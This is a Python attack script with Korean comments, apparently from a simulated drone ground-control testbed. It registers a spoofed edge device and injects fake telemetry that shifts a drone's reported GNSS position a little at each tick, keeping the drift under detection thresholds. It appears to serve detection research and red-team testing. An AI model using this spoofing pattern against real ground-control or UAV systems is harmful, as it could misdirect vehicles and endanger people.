"""
GNSS Drift 누적 공격
PDF 시나리오 #2/#7 | arXiv:2507.11173

외부 공격자가 정상 엣지 디바이스로 위장해 GCS에 텔레메트리를 주입.
좌표를 한 번에 크게 바꾸지 않고 매 틱 소량 오프셋을 누적시켜
탐지 임계값 이하에서 경로를 서서히 이탈시킨다.
"""
from __future__ import annotations
import argparse, math, random, time
from .common import GcsClient, wait_for_gcs


BASE_POSITIONS = {
    "ground-convoy-01":   [150.0, -180.0, 12.0],
    "small-dronebot-01":  [200.0, -220.0, 95.0],
}


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="GNSS Drift 공격 컨테이너")
    parser.add_argument("--service-url", default="http://dah-gcs:8080")
    parser.add_argument("--target-asset",  default="small-dronebot-01")
    parser.add_argument("--spoof-edge-id", default="edge-attack-gnss-01")
    parser.add_argument("--drift-rate",    type=float, default=0.6,
                        help="틱당 최대 드리프트 m (작을수록 은밀)")
    parser.add_argument("--interval-s",    type=float, default=0.8)
    parser.add_argument("--duration-s",    type=float, default=120.0)
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    # 공격자 엣지로 위장 등록
    try:
        client.post("/api/edge/devices/register", {
            "edge_id":         args.spoof_edge_id,
            "device_type":     "uav_edge",
            "asset_ids":       [args.target_asset],
            "authority":       "EXTERNAL-ATTACKER",
            "link_profiles":   ["rf_spoofed"],
            "capabilities":    ["telemetry_ingest"],
            "software_version": "spoof-gnss-0.1",
        })
        print(f"[gnss_drift] 위장 엣지 등록: {args.spoof_edge_id} -> {args.target_asset}", flush=True)
    except Exception as e:
        print(f"[gnss_drift] 등록 실패 (이미 존재할 수 있음): {e}", flush=True)

    base = list(BASE_POSITIONS.get(args.target_asset, [200.0, -220.0, 95.0]))
    drift = [0.0, 0.0, 0.0]
    start = time.time()
    tick = 0

    while (time.time() - start) < args.duration_s:
        # 편향 누적: X/Y는 양의 방향으로 서서히 치우침
        drift[0] += (random.random() - 0.44) * args.drift_rate
        drift[1] += (random.random() - 0.44) * args.drift_rate
        drift[2] += (random.random() - 0.50) * args.drift_rate * 0.3

        spoofed = [base[i] + drift[i] for i in range(3)]
        elapsed = time.time() - start
        track_confidence = max(0.55, 0.92 - elapsed * 0.003)  # 천천히 하락

        try:
            client.post("/api/telemetry/ingest", {
                "asset_id":        args.target_asset,
                "time_s":          tick * args.interval_s,
                "position":        spoofed,
                "velocity_mps":    [14.0 + random.gauss(0, 0.5), 1.2, 0.1],
                "heading_deg":     (tick * 12) % 360,
                "status":          "edge-live",
                "mission_id":      "dronebot-local-recon",
                "source":          "GNSS-SPOOF",
                "source_id":       args.spoof_edge_id,
                "source_type":     "uav_edge",
                "source_authority": "EXTERNAL-ATTACKER",
                "track_confidence": track_confidence,
                "link_profile":    "rf_spoofed",
            })
            total_drift = math.sqrt(sum(d**2 for d in drift))
            print(
                f"[gnss_drift] tick={tick:04d} | 드리프트={total_drift:.1f}m "
                f"| pos=[{spoofed[0]:.1f},{spoofed[1]:.1f},{spoofed[2]:.1f}] "
                f"| conf={track_confidence:.2f}",
                flush=True,
            )
        except Exception as e:
            print(f"[gnss_drift] 오류: {e}", flush=True)

        tick += 1
        time.sleep(args.interval_s)

    print(f"[gnss_drift] 공격 종료 — 총 드리프트: {math.sqrt(sum(d**2 for d in drift)):.1f}m", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
